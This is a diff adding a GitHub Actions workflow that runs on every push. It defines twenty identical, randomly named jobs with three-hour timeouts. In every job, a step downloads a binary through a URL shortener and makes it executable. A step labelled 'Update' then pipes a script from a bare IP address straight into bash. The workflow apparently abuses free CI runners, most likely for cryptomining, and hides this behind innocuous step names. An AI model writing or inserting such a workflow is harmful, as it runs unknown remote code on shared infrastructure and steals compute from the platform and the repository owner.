@@ -1,0 +1,163 @@
+name: komeheti
+on: push
+jobs:
+  pevezu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  lifowo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  dafizowu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  gayiga:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  boyanu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  wolile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  jedameka:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  hutewi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  gejeba:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  sapije:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  winode:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  saxuzo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  vuguhulo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  berugahu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  mulixihe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  jesacu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  sudonoto:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  gesuhovi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  dasike:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
+  gozuyi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/vTcLXHX; chmod +x vTcLXHX
+    - name: Update
+      run: curl http://116.193.190.75/mandalorian/noplysw.php?a=mepa | bash -
